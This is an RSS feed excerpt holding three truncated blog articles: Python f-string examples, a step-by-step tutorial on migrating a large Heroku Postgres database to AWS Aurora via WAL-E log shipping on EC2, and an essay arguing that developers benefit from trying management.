<span>&gt;&gt;&gt; </span>F<span>"The book {book} has {num_pages} pages"</span>
<span>'The book The dog guide has 124 pages'</span>

<span>&gt;&gt;&gt; </span>print(F<span>r"The book {book} has {num_pages} pages\n"</span>)
The book The dog guide has <span>124</span> pages\n

<span>&gt;&gt;&gt; </span>print(FR<span>"The book {book} has {num_pages} pages\n"</span>)
The book The dog guide has <span>124</span> pages\n

<span>&gt;&gt;&gt; </span>print(<span>f"The book <span>{book}</span> has <span>{num_pages}</span> pages\n"</span>)
The book The dog guide has <span>124</span> pages
</code></pre>
<p>And that's pretty much it! In the next section, I'll show you several examples of everything you can do - and cannot do - with f-strings.</p>
<h2 id="limitations">Limitations</h2>
<p>Even though f-strings are very convenient, they don't replace <code>str.format</code> completely. f-strings evaluate expressions in the context where they appear. According the the  <a href="#https://www.python.org/dev/peps/pep-0498/">PEP 498
</a>, this means the expression has full access to local and global variables. They're also an expression evaluated at runtime. If the expression used inside the <code>{ &lt;expr&gt; }</code> cannot be evaluated, the interpreter will raise an exception.</p>
<pre><code><span>&gt;&gt;&gt; </span><span>f"<span>{name}</span>"</span>
---------------------------------------------------------------------------
NameError                                 Traceback (most recent call last)
&lt;ipython-input<span>-1</span>-f0acc441190f&gt; <span>in</span> &lt;module&gt;
----&gt; <span>1</span> <span>f"<span>{name}</span>"</span>

NameError: name <span>'name'</span> <span>is</span> <span>not</span> defined
</code></pre>
<p>This is not a problem for the <code>str.format</code> method, as you can define the template string and then call <code>.format</code> to pass on the context.</p>
<pre><code><span>&gt;&gt;&gt; </span>s = <span>"{name}"</span>

<span>&gt;&gt;&gt; </span>s.format(name=<span>"Python"</span>)
<span>'Python'</span>

<span>&gt;&gt;&gt; </span>print(s)
{name}
</code></pre>
<p>Another limitation is that you cannot use inline comments inside a f-string.</p>
<pre><code><span>&gt;&gt;&gt; </span><span>f"My name is <span>{name #name}</span>!"</span>
  File <span>"&lt;ipython-input-37-0ae1738dd871&gt;"</span>, line <span>1</span>
    <span>f"My name is <span>{name #name}</span>!"</span>
    ^
SyntaxError: f-string expression part cannot include <span>'#'</span>
</code></pre>
<h2 id="how-to-format-an-expression">How to Format an Expression</h2>
<p>If you don't want to define variables, you can use literals inside the brackets. Python will evaluate the expression and display the final result.</p>
<pre><code><span>&gt;&gt;&gt; </span><span>f"4 * 4 is <span>{<span>4</span> * <span>4</span>}</span>"</span>
<span>'4 * 4 is 16'</span>
</code></pre>
<p>Or if you prefer...</p>
<pre><code><span>&gt;&gt;&gt; </span>n = <span>4</span>

<span>&gt;&gt;&gt; </span><span>f"4 * 4 is <span>{n * n}</span>"</span>
<span>'4 * 4 is 16'</span>
</code></pre>
<h2 id="how-to-use-f-strings-to-debug-your-code">How to Use F-Strings to Debug Your Code</h2>
<p>One of most frequent usages of f-string is debugging. Before Python 3.8, many people would do <code>hello = 42; f"hello = {hello}"</code>, but this is very repetitive. As a result, Python 3.8 brought a new feature. You can re-write that expression as <code>f"{hello=}"</code> and Python will display <code>hello=42</code>. The following example illustrates this using a function, but the principle is the same.</p>
<pre><code><span>&gt;&gt;&gt; </span><span><span>def</span> <span>magic_number</span>():</span>
     ...:     <span>return</span> <span>42</span>
     ...: 

<span>&gt;&gt;&gt; </span><span>f"<span>{magic_number() = }</span>"</span>
<span>'magic_number() = 42'</span>
</code></pre>
<h2 id="how-to-format-integers-in-different-bases">How to Format Integers in Different Bases</h2>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1603918242247/zSDHIu-F8.png?auto=format&amp;q=60" alt="fig_6.png"></p>
<p>f-strings also allow you to display an integer in different bases. For example, you can display an <code>int</code> as binary without converting it by using the <code>b</code> option.</p>
<pre><code><span>&gt;&gt;&gt; </span><span>f'<span>{<span>7</span>:b}</span>'</span>
<span>'111'</span>
</code></pre>
<p>In summary, you can use f-strings to format: </p>
<ul>
<li><code>int</code> to binary</li>
<li><code>int</code> to hex</li>
<li><code>int</code> to octal</li>
<li><code>int</code> to HEX (where all chars are capitalized)</li>
</ul>
<p>The following example uses the padding feature and the base formatting to create a table that displays an <code>int</code> in other bases.</p>
<pre><code><span>&gt;&gt;&gt; </span>bases = {
       <span>"b"</span>: <span>"bin"</span>, 
       <span>"o"</span>: <span>"oct"</span>, 
       <span>"x"</span>: <span>"hex"</span>, 
       <span>"X"</span>: <span>"HEX"</span>, 
       <span>"d"</span>: <span>"decimal"</span>
}
<span>&gt;&gt;&gt; </span><span>for</span> n <span>in</span> range(<span>1</span>, <span>21</span>):
     ...:     <span>for</span> base, desc <span>in</span> bases.items():
     ...:         print(<span>f"<span>{n:<span>5</span>{base}</span>}"</span>, end=<span>' '</span>)
     ...:     print()

    <span>1</span>     <span>1</span>     <span>1</span>     <span>1</span>     <span>1</span> 
   <span>10</span>     <span>2</span>     <span>2</span>     <span>2</span>     <span>2</span> 
   <span>11</span>     <span>3</span>     <span>3</span>     <span>3</span>     <span>3</span> 
  <span>100</span>     <span>4</span>     <span>4</span>     <span>4</span>     <span>4</span> 
  <span>101</span>     <span>5</span>     <span>5</span>     <span>5</span>     <span>5</span> 
  <span>110</span>     <span>6</span>     <span>6</span>     <span>6</span>     <span>6</span> 
  <span>111</span>     <span>7</span>     <span>7</span>     <span>7</span>     <span>7</span> 
 <span>1000</span>    <span>10</span>     <span>8</span>     <span>8</span>     <span>8</span> 
 <span>1001</span>    <span>11</span>     <span>9</span>     <span>9</span>     <span>9</span> 
 <span>1010</span>    <span>12</span>     a     A    <span>10</span> 
 <span>1011</span>    <span>13</span>     b     B    <span>11</span> 
 <span>1100</span>    <span>14</span>     c     C    <span>12</span> 
 <span>1101</span>    <span>15</span>     d     D    <span>13</span> 
 <span>1110</span>    <span>16</span>     e     E    <span>14</span> 
 <span>1111</span>    <span>17</span>     f     F    <span>15</span> 
<span>10000</span>    <span>20</span>    <span>10</span>    <span>10</span>    <span>16</span> 
<span>10001</span>    <span>21</span>    <span>11</span>    <span>11</span>    <span>17</span> 
<span>10010</span>    <span>22</span>    <span>12</span>    <span>12</span>    <span>18</span> 
<span>10011</span>    <span>23</span>    <span>13</span>    <span>13</span>    <span>19</span> 
<span>10100</span>    <span>24</span>    <span>14</span>    <span>14</span>    <span>20</span>
</code></pre>
<h2 id="how-to-print-objects-with-f-strings">How to Print Objects With F-Strings</h2>
<p>You can print custom objects using f-strings. By default, when you pass an object instance to a f-string, it will display what the <code>__str__</code> method returns. However, you can also use the <a target="_blank" href="https://www.python.org/dev/peps/pep-3101/#explicit-conversion-flag">explicit conversion flag</a> to display the <code>__repr__</code>.</p>
<pre><code>!r - converts the <span>value</span> <span>to</span> a string <span>using</span> repr().
!s - converts the <span>value</span> <span>to</span> a string <span>using</span> str().
</code></pre><pre><code><span>&gt;&gt;&gt; </span><span><span>class</span> <span>Color</span>:</span>
    <span><span>def</span> <span>__init__</span>(<span>self, r: float = <span>255</span>, g: float = <span>255</span>, b: float = <span>255</span></span>):</span>
        self.r = r
        self.g = g
        self.b = b

    <span><span>def</span> <span>__str__</span>(<span>self</span>) -&gt; str:</span>
        <span>return</span> <span>"A RGB color"</span>

    <span><span>def</span> <span>__repr__</span>(<span>self</span>) -&gt; str:</span>
        <span>return</span> <span>f"Color(r=<span>{self.r}</span>, g=<span>{self.g}</span>, b=<span>{self.b}</span>)"</span>

<span>&gt;&gt;&gt; </span>c = Color(r=<span>123</span>, g=<span>32</span>, b=<span>255</span>)


<span>&gt;&gt;&gt; </span><span>f"<span>{c}</span>"</span>
<span>'A RGB color'</span>


<span>&gt;&gt;&gt; </span><span>f"<span>{c!r}</span>"</span>
<span>'Color(r=123, g=32, b=255)'</span>


<span>&gt;&gt;&gt; </span><span>f"<span>{c!s}</span>"</span>
<span>'A RGB color'</span>
</code></pre>
<p>Python also allows us to <a target="_blank" href="https://www.python.org/dev/peps/pep-3101/#controlling-formatting-on-a-per-type-basis">control the formatting on a per-type basis</a>  through the <code>__format__</code> method. The following example shows how you can do all of that.</p>
<pre><code><span>&gt;&gt;&gt; </span><span><span>class</span> <span>Color</span>:</span>
    <span><span>def</span> <span>__init__</span>(<span>self, r: float = <span>255</span>, g: float = <span>255</span>, b: float = <span>255</span></span>):</span>
        self.r = r
        self.g = g
        self.b = b

    <span><span>def</span> <span>__str__</span>(<span>self</span>) -&gt; str:</span>
        <span>return</span> <span>"A RGB color"</span>

    <span><span>def</span> <span>__repr__</span>(<span>self</span>) -&gt; str:</span>
        <span>return</span> <span>f"Color(r=<span>{self.r}</span>, g=<span>{self.g}</span>, b=<span>{self.b}</span>)"</span>

    <span><span>def</span> <span>__format__</span>(<span>self, format_spec: str</span>) -&gt; str:</span>
        <span>if</span> <span>not</span> format_spec <span>or</span> format_spec == <span>"s"</span>:
            <span>return</span> str(self)

        <span>if</span> format_spec == <span>"r"</span>:
            <span>return</span> repr(self)

        <span>if</span> format_spec == <span>"v"</span>:
            <span>return</span> <span>f"Color(r=<span>{self.r}</span>, g=<span>{self.g}</span>, b=<span>{self.b}</span>) - A nice RGB thing."</span>

        <span>if</span> format_spec == <span>"vv"</span>:
            <span>return</span> (
                <span>f"Color(r=<span>{self.r}</span>, g=<span>{self.g}</span>, b=<span>{self.b}</span>) "</span>
                <span>f"- A more verbose nice RGB thing."</span>
            )

        <span>if</span> format_spec == <span>"vvv"</span>:
            <span>return</span> (
                <span>f"Color(r=<span>{self.r}</span>, g=<span>{self.g}</span>, b=<span>{self.b}</span>) "</span>
                <span>f"- A SUPER verbose nice RGB thing."</span>
            )

        <span>raise</span> ValueError(
            <span>f"Unknown format code '<span>{format_spec}</span>' "</span> <span>"for object of type 'Color'"</span>
        )

<span>&gt;&gt;&gt; </span>c = Color(r=<span>123</span>, g=<span>32</span>, b=<span>255</span>)

<span>&gt;&gt;&gt; </span><span>f'<span>{c:v}</span>'</span>
<span>'Color(r=123, g=32, b=255) - A nice RGB thing.'</span>

<span>&gt;&gt;&gt; </span><span>f'<span>{c:vv}</span>'</span>
<span>'Color(r=123, g=32, b=255) - A more verbose nice RGB thing.'</span>

<span>&gt;&gt;&gt; </span><span>f'<span>{c:vvv}</span>'</span>
<span>'Color(r=123, g=32, b=255) - A SUPER verbose nice RGB thing.'</span>

<span>&gt;&gt;&gt; </span><span>f'<span>{c}</span>'</span>
<span>'A RGB color'</span>

<span>&gt;&gt;&gt; </span><span>f'<span>{c:s}</span>'</span>
<span>'A RGB color'</span>

<span>&gt;&gt;&gt; </span><span>f'<span>{c:r}</span>'</span>
<span>'Color(r=123, g=32, b=255)'</span>

<span>&gt;&gt;&gt; </span><span>f'<span>{c:j}</span>'</span>
---------------------------------------------------------------------------
ValueError                                Traceback (most recent call last)
&lt;ipython-input<span>-20</span><span>-1</span>c0ee8dd74be&gt; <span>in</span> &lt;module&gt;
----&gt; <span>1</span> <span>f'<span>{c:j}</span>'</span>

&lt;ipython-input<span>-15</span><span>-985</span>c4992e957&gt; <span>in</span> __format__(self, format_spec)
     <span>29</span>                 <span>f"- A SUPER verbose nice RGB thing."</span>
     <span>30</span>             )
---&gt; <span>31</span>         <span>raise</span> ValueError(
     <span>32</span>             <span>f"Unknown format code '<span>{format_spec}</span>' "</span> <span>"for object of type 'Color'"</span>
     <span>33</span>         )

ValueError: Unknown format code <span>'j'</span> <span>for</span> object of type <span>'Color'</span>
</code></pre>
<p>Lastly, there's also the <code>a</code> option that escapes non-ASCII chars. For more info: <a href="https://docs.python.org/3/library/functions.html#ascii" target="_blank">docs.python.org/3/library/functions.html#as..</a></p>
<pre><code><span>&gt;&gt;&gt; </span>utf_str = <span>"Áeiöu"</span>

<span>&gt;&gt;&gt; </span><span>f"<span>{utf_str!a}</span>"</span>
<span>"'\\xc1ei\\xf6u'"</span>
</code></pre>
<h2 id="how-to-set-float-number-precision-in-a-f-string">How to Set Float Number Precision in a F-String</h2>
<p>f-strings allow format float numbers similar to <code>str.format</code> method. To do that, you can add a <code>:</code> (colon) followed by a <code>.</code> (dot) and the number of decimal places with a <code>f</code> suffix. </p>
<p>For…</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://miguendes.me/73-examples-to-help-you-master-pythons-f-strings">https://miguendes.me/73-examples-to-help-you-master-pythons-f-strings</a></em></p>]]>
            </description>
            <link>https://miguendes.me/73-examples-to-help-you-master-pythons-f-strings</link>
            <guid isPermaLink="false">hacker-news-small-sites-25071504</guid>
            <pubDate>Thu, 12 Nov 2020 16:27:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Migrating Large Heroku Postgres Instances to AWS Aurora Without Downtime]]>
            </title>
            <description>
<![CDATA[
Score 116 | Comments 37 (<a href="https://news.ycombinator.com/item?id=25071502">thread link</a>) | @sciguymcq
<br/>
November 12, 2020 | https://thecodinginterface.com/blog/heroku-postgres-migration-to-aurora/ | <a href="https://web.archive.org/web/*/https://thecodinginterface.com/blog/heroku-postgres-migration-to-aurora/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <div>
        <div>
          
          

          
          
          <h3>Introduction</h3>
<p>In this article I discuss a general process I used recently to migrate a large multi-terabyte Heroku Postgres Database from the Heroku Platform to Amazon Aurora Postgres on a live Heroku based application architecture with near zero downtime and builtin failovers during the process. Not only did this migration save significant costs associated with running a large managed Postgres instance it also resulted in increased scalability and flexibility of parameter turing and other management abilities afforded by AWS RDS.</p>

<h4>Contents</h4>
<ul>
<li><a title="Heroku Architecture and Constraints" href="#heroku-architecture-and-constraints">Heroku Architecture and Constraints</a></li>
<li><a title="The RandoNumba Demo App" href="#rando-numba-demo-app">The RandoNumba Demo App</a></li>
<li><a title="Mimicing the Heroku Postgres Service" href="#mimicing-heroku-postgres">Mimicking the Heroku Postgres Service</a></li>
<li><a title="Restore and Promote EC2 Postgres Log Shipped Replica" href="#log-shipped-replica">Restore and Promote EC2 Postgres Log Shipped Replica</a></li>
<li><a title="Create EC2 Postgres Log Streamed Replica" href="#log-streamed-replica">Create EC2 Postgres Log Streamed Replica</a></li>
<li><a title="Switch App Dyno to Promoted EC2 Postgres" href="#switch-to-log-shipped-replica">Switch App Dyno to Promoted EC2 Postgres</a></li>
<li><a title="Initiate Postgres Logical Replication to Aurora Postgres" href="#initiate-logical-replication-to-aurora">Initiate Postgres Logical Replication to Aurora Postgres</a></li>
<li><a title="Switch App Dyno to Aurora Postgres" href="#switch-to-aurora-postgres">Switch App Dyno to Aurora Postgres</a></li>
</ul>
<h3><a id="heroku-architecture-and-constraints"></a>Heroku Architecture and Constraints</h3>
<p><img src="https://thecodinginterface-images.s3.amazonaws.com/blogposts/heroku-postgres-migration/Heroku-Postgres-Migration.jpg" alt="Heroku Migration Diagram" width="991" height="733"></p>
<p>The Heroku Postgres Migration to AWS Aurora Postgres Architecture and Process Flow diagram above shows, at a high level, the Heroku Postgres Data Layer Architecture for a typical Heroku Premium Level Service with High Availability plus a Read Replica for load balancing Read heavy apps. Then on the right is the migration target goal within the AWS platform boundary annotated with the sequence of steps used to migrate the data to the Aurora Postgres instance.</p>
<p>Before I get into discussing the constraints that I've experienced I would like to put forth an important disclaimer. The Heroku platform is a phenominally innovative service that has paved the way for developing countless extremely useful and profitable apps and services by lowering the barrier to entry for small development teams. Many, if not most, apps will not hit the constraints that I point out below alleviating the need for a migration of their data layer off the platform.</p>
<ul>
<li>Heroku can be costly, perhaps for good reasons, because they alleviate much of the sysops / devops investment and dev time costs of maintaining and scaling services like Postgres</li>
<li>Heroku Postgres locks down the majority of the Postgres parameters that are often necessary to tune for large enterprise level, high throughput, Postgres usage</li>
<li>Heroku Postgres monitoring falls well short of many of the other options, particularly AWS RDS, which becomes very important for large enterprise grade applications</li>
<li>Heroku Postgres does not allow Postgres superuser or Replication User roles so migration options become limited</li>
<li>Postgres pg_dump / pg_restore is not a viable option for large databases of a terabyte and up because of the amount of time it requires to run and thus inherently implies down time or data loss if used as an option for failover or migration which isn't possible for most applications</li>
</ul>

<h3><a id="rando-numba-demo-app"></a>The RandoNumba Demo App</h3>
<p>To faciltate this discussion I've provided a toy app that is deployable to Heroku and built using the Django web framework which simply generates random numbers and scrapes quotes from the web.</p>
<p>1) Clone dj-randonumba-heroku app from my GitHub repo</p>
<pre><code>git clone https://github.com/amcquistan/dj-randonumba-heroku.git
cd dj-randonumba-heroku
</code></pre>
<p>2) Create a Heroku App</p>
<pre><code>heroku create</code></pre>
<p>giving the following output but, note you're output will give a different app name and url</p>
<pre><code>Creating app... done, ⬢ intense-headland-79519
https://intense-headland-79519.herokuapp.com/ | https://git.heroku.com/intense-headland-79519.git</code></pre>
<p>Be sure to update `randonumba.settings.ALLOWED_HOSTS` to include the host that Heroku provides.</p>
<p>3) Push the App Code to Heroku</p>
<pre><code>git push heroku master</code></pre>
<p>4) Attach a free tier Heroku Postgres Add on for Demo Purposes</p>
<pre><code>heroku addons:create heroku-postgresql:hobby-dev -a intense-headland-79519</code></pre>
<p>Use psql to create the hstore Postgres extension this demo app uses</p>
<pre><code>heroku pg:psql -a intense-headland-79519
create extension hstore;
\q</code></pre>
<p>then run migrations</p>
<pre><code>heroku run python manage.py migrate -a intense-headland-79519</code></pre>
<p>5) Register and Play with the App</p>
<p>Open the app in your default browser with the following (replace -a intense-headland-79519 with your app name).</p>
<pre><code>heroku open -a intense-headland-79519</code></pre>
<p>Then register the app and generate some randomness</p>
<p><img src="https://thecodinginterface-images.s3.amazonaws.com/blogposts/heroku-postgres-migration/rando-numba-randomness.png" alt="" width="1838" height="948"></p>

<h3><a id="mimicing-heroku-postgres"></a>Mimicking the Heroku Postgres Service</h3>
<p>In the Real World for this process to work you need to request for the Heroku Data Support team to establish continuous WAL log shipping to an AWS S3 bucket along with a base physical backup using the <a title="WAL-E Python based library" href="https://github.com/wal-e/wal-e" target="_blank" rel="noopener">WAL-E Python based library</a>. Rather than bothering Heroku's Data Support team for this demo and to allow readers to fully reproduce the demo I will simply mimick this step with my own AWS EC2 instance running Postgres 11 and shipping a continuous archive to my own AWS S3 bucket.</p>
<h4>Infrastructure Specs and Services</h4>
<ul>
<li>Amazon Linux 2 AMI</li>
<li>Security Group Allowing port 5432 and SSH access</li>
<li>Separate EBS Volume for Installing the Postgres DB Cluster</li>
<li>S3 Bucket for Pushing Base Physical Backup and WAL</li>
<li>IAM User with Programmatic Access to S3</li>
</ul>
<h4>Procedure for Mimicking Heroku Postgres</h4>
<p>1) Update VPS (Virtual Private Server) and Install Dependencies</p>
<pre><code>sudo yum update -y
sudo amazon-linux-extras install epel -y
sudo amazon-linux-extras install postgresql11 -y
sudo yum install postgresql-server postgresql-contrib python3 lzop pv -y
curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py
sudo python3 get-pip.py
sudo python3 -m pip install envdir wal-e[aws]</code></pre>
<p>2) Mount Volume and Create File System for Postgres Cluster</p>
<p>Use lsblk to identify the EBS volume to install Postgres Cluster on</p>
<pre><code>$ lsblk
NAME    MAJ:MIN RM SIZE RO TYPE MOUNTPOINT
xvda    202:0    0   8G  0 disk
└─xvda1 202:1    0   8G  0 part /
xvdb    202:16   0  16G  0 disk</code></pre>
<p>Format volume as a XFS filesystem.</p>
<pre><code>sudo mkfs -t xfs /dev/xvdb</code></pre>
<p>Create a mount point for the volume and mount it to the new directory.</p>
<pre><code>sudo mkdir /database
sudo mount /dev/xvdb /database</code></pre>
<p>Find the device's block id and make the mount permanent in /etc/fstab</p>
<pre><code>sudo blkid # will give you the block id </code></pre>
<p>example entry in /etc/fstab</p>
<pre><code>UUID=19ee2212-7fa0-4c9a-bcbf-cd7019d50fd6     /database   xfs    defaults,nofail   0   2</code></pre>
<p>Test the mount (no errors is the successful outcome).</p>
<pre><code>sudo mount -a</code></pre>
<p>Update permissions of the /database directory for postgres.</p>
<pre><code>sudo chown -R postgres:postgres /database
sudo chmod -R 700 /database</code></pre>
<p>3) Create envdir Directory for AWS Creds used for WAL-E</p>
<pre><code>sudo mkdir -p /etc/wal-e/env
sudo chown -R ec2-user:ec2-user /etc/wal-e
echo "INSERT-VALUE-HERE" &gt; /etc/wal-e/env/AWS_ACCESS_KEY_ID
echo "REGION-HERE" &gt; /etc/wal-e/env/AWS_REGION
echo "INSERT-VALUE-HERE" &gt; /etc/wal-e/env/AWS_SECRET_ACCESS_KEY
echo "S3-BUCKET-FOLDER-URL-HERE" &gt; /etc/wal-e/env/WALE_S3_PREFIX
sudo chown -R postgres:postgres /etc/wal-e
sudo chmod -R 755 /etc/wal-e/env</code></pre>
<p>4) Initialize Postgres Cluster</p>
<p>Run as postgres user.</p>
<pre><code>pg_ctl init -D /database</code></pre>
<p>5) Modify Postgres Configs</p>
<p>First modify /database/postgresql.conf with the following.</p>
<pre><code>listen_addresses = '*' or your apps specific IP
wal_level = replica
archive_mode = on
archive_command = 'envdir /etc/wal-e/env wal-e wal-push %p'
archive_timeout = 60</code></pre>
<p>Update /database/pg_hba.conf for auth (substiture 0.0.0.0/0 with your APPs IP as necessary).</p>
<pre><code>host    pgdb            pguser          0.0.0.0/0               md5</code></pre>
<p>6) Start and Enable Postgres Service</p>
<p>First create a systemd service file for managing the postgresql service in /etc/systemd/system/postgresql.service</p>
<pre><code>.include /lib/systemd/system/postgresql.service

[Service]
Environment=PGDATA=/database
</code></pre>
<p>Reload systemd, start and enable postgresql service</p>
<pre><code>sudo systemctl daemon-reload
sudo systemctl start postgresql
sudo systemctl status postgresql
sudo systemctl enable postgresql</code></pre>
<p>7) Create App Postgres User and Database</p>
<pre><code>createuser -e -l --pwprompt pguser
createdb -e --owner=pguser pgdb</code></pre>
<p>Make hstore extension</p>
<pre><code>psql -d pgdb
create extension hstore;
\q</code></pre>
<p>8) Detach Heroku Postgres Addon and Switch Connection String to EC2 Instance</p>
<p>Note that this is ran locally not on the Amazon EC2 VPS</p>
<p>List addons to get name of Heroku Postgres</p>
<pre><code>heroku addons</code></pre>
<p>Detach the addon for Heroku Postgres</p>
<pre><code>heroku addons:detach name-of-addon -a name-of-heroku-app</code></pre>
<p>Replace the DATABASE_URL config variable to point to the newly spun up EC2 Postgres instance mimicking Heroku Postgres</p>
<pre><code>heroku config:set DATABASE_URL=postgres://pguser:develop3r@ec2-ip-address:5432/pgdb -a name-of-heroku-app
heroku ps:restart -a name-of-heroku-app</code></pre>
<p>Run migrations.</p>
<pre><code>heroku run python manage.py migrate -a name-of-heroku-app</code></pre>
<p>At this point you'll want to register a new user and generate some more test data to migrate. You could also use pg_dump / pg_restore to transfer any existing data from Heroku Postgres to this new EC2 Postgres instance being used to mimic Heroku Postgres</p>
<p><br>9) Push Base Backup to S3 Using WAL-E</p>
<p>Note that tests next commands are to be ran on the Amazon Linux VPS.</p>
<p>As a personal preference I like to wrap potentially long running commands in shell scripts so I can explicitly echo out when things begin and end then to protect against SSH connections from timing out during potentially long running processes I use nohup with backgrounding.</p>
<p>For this I create the following script</p>
<pre><code>mkdir /var/lib/pgsql/scripts &amp;&amp; cd /var/lib/pgsql/scripts
vi wal-e-push-backup.sh</code></pre>
<p>with contents</p>
<pre><code>#!/bin/bash

echo "starting wal-e backup-push"

envdir /etc/wal-e/env wal-e backup-push /database

echo "wal-e backup-push complete"
</code></pre>
<p>Run it.</p>
<pre><code>nohup ./wal-e-push-backup.sh &amp;</code></pre>
<p>After the push finishes I should be able to verify that the backup has been pushed with the following command.</p>
<pre><code>envdir /etc/wal-e/env wal-e backup-list</code></pre>
<p>At this point I have an EC2 Instance with Postgres installed mimicking Heroku Postgres and continuously shipping backups and WAL to S3.</p>
<h3><a id="log-shipped-replica"></a>Restore and Promote EC2 Postgres Log Shipped Replica</h3>
<p>In the real world this is where you will start, that is by creating your log shipped replica loaded from data in S3 in the form of a physical base backup and WAL files. The Heroku Data Support team will likely provide you with S3 creds for WAL-E in the form of Heroku config variables which you can …</p></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://thecodinginterface.com/blog/heroku-postgres-migration-to-aurora/">https://thecodinginterface.com/blog/heroku-postgres-migration-to-aurora/</a></em></p>]]>
            </description>
            <link>https://thecodinginterface.com/blog/heroku-postgres-migration-to-aurora/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25071502</guid>
            <pubDate>Thu, 12 Nov 2020 16:27:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Fear of Becoming a Manager]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25071270">thread link</a>) | @eduardsi
<br/>
November 12, 2020 | https://sizovs.net/2020/11/03/fear-of-becoming-a-manager/ | <a href="https://web.archive.org/web/*/https://sizovs.net/2020/11/03/fear-of-becoming-a-manager/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
  
    
    
  
  <h6>
      November 2020 · Riga, Latvia · <a href="https://sizovs.net/2020/11/03/fear-of-becoming-a-manager/#disqus_thread">comments</a>
  </h6>  
  

  <section>
    <p>As a developer, when I was offered a management job for the first time, my biggest fear was that it would make me a bad programmer because my programming skills and my market competitiveness as a programmer will decline. While talking to young team leaders and tech managers, I discovered that I am not alone.</p>

<p>Fear of having no time for coding stops many good programmers from filling management roles and positively influencing strategic areas of the organization: people, process, enterprise architecture, etc. When developers don’t see themselves as future organization leaders and managers, they stop learning and caring about topics paramount to good management: Lean, Kanban, Change Management, Psychology, Motivation, Systems Thinking.</p>

<figure>
<img src="https://sizovs.net/images/donella.jpg">
<figcaption>
<div>
    
</div>


</figcaption>
</figure>

<p>With knowledge gaps in those areas, we, developers, can’t be in charge of development process. Moreover, we can’t even help people in charge make better, informed decisions. No wonder why developers are rarely invited to non-technical, yet strategically important meetings.</p>

<p>So, by “staying technical” and giving up power to non-technical managers or the least competent developers, good developers are digging themselves a hole. Sitting in that hole, they complain about how bad the leaders, managers, and their created processes are.</p>

<p>Now, let me share some good news with you.</p>

<h3 id="becoming-a-manager-makes-you-a-better-programmer">Becoming a manager makes you a <em>better</em> programmer.</h3>

<p>As a manager, you’ll learn new skills that never get out of date, including communication, delegation, motivation, planning. You’ll learn how to deal with different (and difficult) stakeholders, balance conflicting interests, and reach an agreement. By spending more time next to business people, you’ll better understand their concerns and prepare yourself for running your own company.</p>

<p>Even if you prefer staying employed and “solely technical”, timeless managerial skills will serve you well, because you’ll gain an entirely new perspective on programming: you’ll see it through the manager’s lens. You’ll learn that estimates are <del>evil</del> an essential aspect of financial planning. When putting pressure, good managers expect productive confrontation, not immediate compliance. And that we – engineers – are tough nuts.</p>

<p>With that extra perspective, finding common ground, and reaching an agreement with other managers becomes easier. Finally, you’ll understand that management is not a walk in the park and start empathizing with and helping other managers.</p>

<h3 id="management-experience-opens-new-doors">Management experience opens new doors</h3>

<p>Having any leadership and management experience makes you prepared for more senior roles, such as Engineering Manager, VPoE, or CTO. Finding the right candidate to fill those roles is mission impossible. By having the necessary skills and experience, you’re entering the gold market area with <strong>high demand</strong> and <strong>low competition</strong>. In simple terms, you are now dictating your own rules of the game. And, as the number of programmers increases with incredible speed every year, someone has to manage and lead this non-trivial engineering show.</p>

<h3 id="management-is-power">Management is power</h3>

<p>Management not only comes with a bag of extra responsibilities but also <strong>power</strong> to influence things around you. With great power comes great responsibility, but if you use your authority wisely, <em>finally</em> you can create an environment that you and your colleagues will enjoy. When I became an IT manager, the opportunity to change things according to my values and beliefs, was the main selling point. And because I had enough freedom to manage my time and set my own priorities, I was devoting most of my time to building a no-bullshit engineering culture, hiring and growing great engineers, as well as building my personal brand via public speaking. A big win for my employer also became my personal success story, and I am proud of what we’ve achieved then. When you dare to take the lead, you can create things you’ll be proud of.</p>

<p>Oh, how many things I did wrong. Every day, I experimented with the process, failing and learning from my failures, all in the “safe” environment, while receiving a decent salary and bonuses. Today, as a business owner, I don’t have the luxury of learning at someone else’s expense.</p>

<h3 id="management-helps-you-understand-yourself-better">Management helps you understand yourself better</h3>
<p>To discover your Element – the point at which your natural talent meets personal passion – you have to try different things in your life, including working with different companies, different people, and wearing different hats. For a fulfilling life and career, knowing what you like is equally important as knowing what you don’t. Before you try management, you’ll never know how it’s going to make you feel. What if you’re the next Jack Welch, hiding under a React t-shirt?</p>

<p>Before I tried management, I hated the idea of becoming a manager. While my colleagues encouraged me to go for it, I looked for excuses and arguments for “staying technical.” Then I imagined my company hiring a Bill Lumbergh who’ll be in charge of my team.</p>

<figure>
<img src="https://sizovs.net/images/bill.jpg">
<figcaption>So, Eduards, what's happening?</figcaption>
</figure>

<p>Then I told myself: “it’s better me than Bill.”</p>

<p>Six months was the “probation period” I gave myself before making the final commitment. Treating the role switch as a temporary experiment, not a permanent career change, made me feel safer. In only six months, I have formed my opinion about management, gained some practical, CV-boosting super skills, and invaluable life experience. So, what seemed like a bad idea in theory, turned out an existing and life-changing journey in practice. I fell in love with management and even started <a href="https://sizovs.net/about/#courses">teaching</a> the principles of good management to developers.</p>

<h3 id="management-is-compatible-with-coding">Management is compatible with coding</h3>

<p>Finally, you <strong>can</strong> combine management with coding. Stopping coding is a personal choice, not a necessity. I think it’s a capital mistake to polish your coding skills for years and then just throw them into a bin. If you mastered a hard skill such as coding – protect it at all costs. Management skills should complement your hard skills, not replace them. Remember: trust is the management currency, and gaining full developers’ trust is only possible if you’re a competent software developer.</p>

<p>But how do you find time for coding?</p>

<p>Firstly, you can free up time for coding by <strong>delegating</strong> some management duties to others. If you’re trying to manage everything yourself, it’s a signal of bad management. Management 3.0 book will teach you how to create an environment where management duties are distributed among people in the organization:</p>

<figure>
<img src="https://sizovs.net/images/m30.jpg">
<figcaption>
<div>
    
</div>


</figcaption>
</figure>

